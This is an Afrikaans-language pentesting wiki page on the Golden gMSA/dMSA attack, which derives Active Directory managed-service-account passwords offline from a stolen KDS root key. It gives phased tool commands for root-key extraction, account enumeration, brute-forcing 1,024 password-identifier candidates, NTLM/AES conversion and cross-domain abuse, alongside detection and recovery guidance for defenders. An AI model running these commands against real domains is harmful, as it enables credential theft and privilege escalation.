# Golden gMSA/dMSA Attack (Offline-afleiding van Managed Service Account-wagwoorde)

{{#include ../../banners/hacktricks-training.md}}

## Oorsig

Windows Managed Service Accounts is domein-principals wat bedoel is om dienste te laat loop sonder dat ’n administrateur ’n langdurige wagwoord hoef te hanteer:

1. **gMSA** (group Managed Service Account) kan gebruik word deur die rekenaars wat deur `msDS-GroupMSAMembership` / `PrincipalsAllowedToRetrieveManagedPassword` gemagtig is.
2. **dMSA** (delegated Managed Service Account) is in **Windows Server 2025** bekendgestel. Dit koppel normale authentication aan gemagtigde masjien-identiteite en kan ’n legacy service account deur middel van ’n migrasie-werkvloei vervang.

Moenie **Golden dMSA** met **BadSuccessor** verwar nie. Golden dMSA vereis die kompromittering van KDS root-key-materiaal en lei managed-account keys af; [BadSuccessor](badsuccessor-dmsa-migration-abuse.md) misbruik eerder beheer oor ’n dMSA-object en sy migrasie-attribuutte.

’n DC stoor nie ’n onafhanklik gegenereerde clear-text-wagwoord vir elke gMSA nie. Dit lei die account-wagwoord af van ’n **KDS root key**, ’n tydgeïndekseerde Group Key Distribution Protocol (GKDI)-key en die account-SID. Die root-key-objects is `msKds-ProvRootKey`-objects onder `CN=Master Root Keys,CN=Group Key Distribution Service,CN=Services,CN=Configuration,...`; die sensitiewe waarde is `msKds-RootKeyData`. `msDS-ManagedPasswordId` is **nie ’n GUID nie**: dit is ’n binêre key identifier wat die KDS root-key GUID, die GKDI `L0`/`L1`/`L2`-indekse en domein-/forest-metadata bevat. Die DC pas die KDF toe met die label `GMSA PASSWORD` en die binêre SID as context, en stel dan slegs ’n `MSDS-MANAGEDPASSWORD_BLOB` bloot aan principals wat gemagtig is om ’n gMSA-wagwoord te retrieve.<sup>[[2]](#references)</sup>

’n dMSA verskil normaalweg operasioneel: sy secret is bedoel om op die DC te bly, en die KDC reik credentials aan ’n gemagtigde masjien uit. dMSAs hergebruik egter die onderliggende KDS/GKDI-wagwoordafleiding. Golden dMSA rekonstrueer daardie secret direk en omseil dus die bedoelde machine-bound flow en Credential Guard op die service host.<sup>[[1]](#references)</sup>

## Golden gMSA / Golden dMSA Attack

Nadat ’n KDS root key onttrek is, kan ’n aanvaller wagwoorde aflei vir accounts wat aan daardie key gekoppel is sonder om `msDS-ManagedPassword` te lees. Dit omseil die per-account password-retrieval ACL en bly voortbestaan ná gewone managed-password-rotasies solank die gekompromitteerde root key in gebruik bly. Vir gMSAs verskaf die leesbare `msDS-ManagedPasswordId` normaalweg die presiese key identifier. Vir ACL-beperkte dMSAs verminder Golden dMSA die ontbrekende identifier tot slegs **1,024 kandidate**.<sup>[[1]](#references)[[2]](#references)</sup>

### Voorvereistes

* Die relevante KDS root-key-object, gewoonlik verkry met Enterprise Admin / forest-root Domain Admin-regte, `SYSTEM` op ’n DC, of uit ’n blootgestelde DC-databasis of rugsteun.<sup>[[1]](#references)[[2]](#references)</sup>
* Die teiken-account se SID, DNS-domein, forest-naam en `sAMAccountName`.<sup>[[1]](#references)[[2]](#references)</sup>
* Vir direkte gMSA-berekening, sy base64-geënkodeerde `msDS-ManagedPasswordId`; vir Golden dMSA kan dit eerder geraai word.<sup>[[1]](#references)[[2]](#references)</sup>
* ’n x64 Windows-host met .NET Framework 4.7.2 vir [`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA).<sup>[[3]](#references)</sup>

### Fase 1 - Onttrek die KDS root key

`GoldenDMSA` en [`GoldenGMSA`](https://github.com/Semperis/GoldenGMSA) exporteer die root-key-object-velde as ’n base64-blob. Sonder ’n domeinargument doen die tools navrae teen die forest root en vereis hulle geskikte geprivilegieerde directory access. Met die domein-/forest-argument kan `SYSTEM` op ’n DC daardie DC se plaaslike Configuration naming-context-replika navraag doen.<sup>[[1]](#references)[[2]](#references)</sup>
```cmd
:: GoldenDMSA: Enterprise Admin, or SYSTEM on a DC with --domain
GoldendMSA.exe kds
GoldendMSA.exe kds -g KDS_ROOT_KEY_GUID
GoldendMSA.exe kds --domain child.example.local

:: GoldenGMSA equivalents
GoldenGMSA.exe kdsinfo
GoldenGMSA.exe kdsinfo --guid KDS_ROOT_KEY_GUID
```
Teken beide die root-key GUID en die base64 root-key blob aan. ’n Registry `SECURITY`/`SYSTEM` hive export is nie op sigself die KDS root key nie: die gesaghebbende materiaal is in die AD Configuration-partisie.<sup>[[1]](#references)[[2]](#references)</sup>

### Fase 2 - Enumereer gMSA / dMSA-objekte

Vir gMSAs, verkry `sAMAccountName`, `objectSid` en die binêre `msDS-ManagedPasswordId`. Laasgenoemde is normaalweg leesbaar selfs wanneer die caller nie toegelaat word om `msDS-ManagedPassword` te retrieve nie.<sup>[[2]](#references)</sup>
```powershell
Get-ADServiceAccount -Filter * -Properties objectSid,msDS-ManagedPasswordId |
Select-Object sAMAccountName,objectSid,msDS-ManagedPasswordId

GoldenGMSA.exe gmsainfo --domain example.local
```
’n dMSA se verstek-ACL kan LDAP-enumerasie deur gebruikers met lae voorregte voorkom. `GoldenDMSA info` kan óf LDAP navraag doen óf kandidaat-RIDs enumerereer en SIDs deur `LsaLookupSids` oor `\PIPE\lsarpc` oplos, en dan dMSAs van rekenaarrekeninge en gMSAs onderskei.<sup>[[1]](#references)[[3]](#references)</sup>
```cmd
GoldendMSA.exe info -d example.local -m ldap
GoldendMSA.exe info -d example.local -m brute -u alice -p PASSWORD -o EXAMPLE -r 5000
```
### Fase 3 - Rekonstrueer of raai `msDS-ManagedPasswordId`

Die sleutelidentifiseerder sluit `L0Index`, `L1Index` en `L2Index` in, nie ’n rekening-skeppingstydstempel gevolg deur ewekansige bisse nie. Semperis het bevind dat die wagwoord-genereringspad nie die kandidaat-`L0Index` gebruik nie, terwyl `L1Index` en `L2Index` elk beperk is tot waardes `0..31`. Gevolglik kan ’n aanvaller wat die root-key GUID, domein, forest en SID ken, al die `32 * 32 = 1,024` kandidaat-identifiseerders konstrueer.<sup>[[1]](#references)</sup>
```cmd
:: Write 1,024 base64 ManagedPasswordId candidates to KDS_ROOT_KEY_GUID.txt
GoldendMSA.exe wordlist -s DMSA_SID -d example.local -f example.local -k KDS_ROOT_KEY_GUID

:: Derive and validate candidates; -t caches the successful TGT
GoldendMSA.exe bruteforce -s DMSA_SID -i KDS_ROOT_KEY_GUID -k KDS_ROOT_KEY_BASE64 -d example.local -u svc_dmsa$ -t
```
Die afleidings is offline, maar om die aktiewe kandidaat te identifiseer, is gewoonlik authentication-pogings nodig. Dit kan ’n reeks mislukte Kerberos pre-authentication- of NTLM-validasies veroorsaak voordat die geldige sleutel gevind word. Vir AES Kerberos-sleutels is die managed-account salt wat deur die tool gebruik word `UPPERCASE.DNS.DOMAIN` + `host` + die kleinletterrekening se UPN sonder die agterste `$` (byvoorbeeld, `EXAMPLE.LOCALhostsvc_dmsa.example.local`).<sup>[[1]](#references)</sup>

### Fase 4 - Bereken en gebruik die wagwoord

As die presiese identifiseerder bekend is, bereken die 256-grepe-wagwoordbuffer en skakel dit om na NTLM/AES-materiaal. Die base64-waarde wat deur hierdie tools gedruk word, is die geënkodeerde wagwoordbuffer, **nie** die LDAP `MSDS-MANAGEDPASSWORD_BLOB` self nie.<sup>[[2]](#references)[[3]](#references)</sup>
```cmd
GoldendMSA.exe compute -s ACCOUNT_SID -k KDS_ROOT_KEY_BASE64 -d example.local -m MANAGED_PASSWORD_ID_BASE64
GoldendMSA.exe convert -d example.local -u svc_account$ -p BASE64_PASSWORD

GoldenGMSA.exe compute --sid ACCOUNT_SID --kdskey KDS_ROOT_KEY_BASE64 --pwdid MANAGED_PASSWORD_ID_BASE64
```
Die NTLM-resultaat kan gebruik word waar NTLM aanvaar word; die AES-sleutel kan gebruik word vir overpass-the-hash / TGT-versoeke waar die managed account slegs AES gebruik. Dit gee die voorregte, SPNs, delegation-konfigurasie en hulpbrontoegang van die gekompromitteerde managed service account, sonder om die aanvaller se masjien by `PrincipalsAllowedToRetrieveManagedPassword` te voeg.<sup>[[1]](#references)[[2]](#references)</sup>

### Misbruik van die Configuration-partition oor domeine heen

KDS root-key-objekte is in die forest Configuration naming context geleë, wat na DCs in child domains gerepliseer word. Gevolglik kan `SYSTEM` op ’n child-domain DC die forest-root KDS-materiaal vanaf die child DC se plaaslike replika lees, selfs al kan child Domain Admins nie die objek direk vanaf ’n forest-root DC lees nie. Indien die aanvaller ook ’n parent-domain gMSA se `msDS-ManagedPasswordId` kan lees, kan GoldenGMSA daardie parent-account se wagwoord bereken; SID filtering voorkom nie hierdie kriptografiese aanval nie.<sup>[[5]](#references)</sup>
```cmd
:: Run as SYSTEM on a child.example.local DC
GoldenGMSA.exe kdsinfo --forest child.example.local

:: Query target metadata in the parent, then combine both inputs
GoldenGMSA.exe gmsainfo --domain example.local
GoldenGMSA.exe compute --sid PARENT_GMSA_SID --domain example.local --forest child.example.local
```
## Opsporing, Inperking en Herstel

* Configureer ’n SACL op die **Master Root Keys**-houer, geërf deur `msKds-ProvRootKey`-objects, vir suksesvolle leesaksies van `msKds-RootKeyData`. Met Directory Service Access auditing geaktiveer, genereer ’n online extraction Security event **4662**; ondersoek subjects wat nie verwagte DCs of Tier-0-operateurs is nie. Oudit ook veranderinge aan hierdie SACLs en root-key-object ACLs.<sup>[[1]](#references)[[2]](#references)[[4]](#references)</sup>
* ’n child-to-parent attack lees die KDS-object vanaf die gekompromitteerde child DC se plaaslike replica, dus sal die forest-root domain moontlik nie daardie leesaksie waarneem nie. Oudit in die parent domain suksesvolle leesaksies van `msDS-ManagedPasswordId` (schema GUID `0e78295a-c6d3-0a40-b491-d62251ffa0a6`) op `msDS-GroupManagedServiceAccount`-objects en ondersoek leesaksies deur principals van ’n ander domain.<sup>[[5]](#references)</sup>
* Korrelleer KDS-objecttoegang met ongewone logons deur managed accounts en oplewings van Kerberos/NTLM-foute vir service accounts met ’n `$`-agtervoegsel. Offline computation ná vorige diefstal van die database/backup is nie sigbaar vir ’n live DC nie.<sup>[[1]](#references)[[3]](#references)</sup>
* Gewone password rotation is nie voldoende ná root-key exposure nie. Microsoft se huidige recovery procedure skep ’n nuwe KDS root key, herbegin KDS op alle relevante DCs en skuif geaffekteerde accounts na daardie key. As die omvang/tyd van die exposure onbekend is en dit onaanvaarbaar is om vir ’n veilige roll te wag, vervang elke gMSA wat die gekompromitteerde key gebruik het; indien die omvang bekend is, dokumenteer Microsoft ’n authoritative-restore workflow om veilige rolling af te dwing. Valideer die nuwe key GUID in `msDS-ManagedPasswordId` voordat die ou key uitgevee word.<sup>[[4]](#references)</sup>
* Behandel DC-database- en backup-toegang, Configuration-partition replication en KDS root-key administration as Tier-0. Die vermindering van `ManagedPasswordIntervalInDays` beperk sommige recovery windows, maar revoke nie ’n root key wat reeds gekompromitteer is nie.<sup>[[4]](#references)</sup>

## Tooling

* [`Semperis/GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) - dMSA/gMSA-enumeration, identifier generation, 1,024-candidate validation, password computation en NTLM/AES conversion.<sup>[[3]](#references)</sup>
* [`Semperis/GoldenGMSA`](https://github.com/Semperis/GoldenGMSA/) - gMSA/KDS-enumeration en online, offline en cross-domain password computation.<sup>[[2]](#references)</sup>
* [`Rubeus`](https://github.com/GhostPack/Rubeus) en [`Impacket`](https://github.com/fortra/impacket) - gebruik of valideer die derived NTLM/AES keys in authorised testing.



## References

- [1] [Golden dMSA - authentication bypass for delegated Managed Service Accounts](https://www.semperis.com/blog/golden-dmsa-what-is-dmsa-authentication-bypass/)
- [2] [gMSA Active Directory Attacks](https://www.semperis.com/blog/golden-gmsa-attack/)
- [3] [Semperis/GoldenDMSA GitHub repository](https://github.com/Semperis/GoldenDMSA)
- [4] [Microsoft - How to recover from a Golden gMSA attack](https://learn.microsoft.com/en-us/troubleshoot/windows-server/windows-security/recover-from-golden-gmsa-attack)
- [5] [SID filter as security boundary between domains? Part 5 - Golden gMSA trust attack](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
{{#include ../../banners/hacktricks-training.md}}
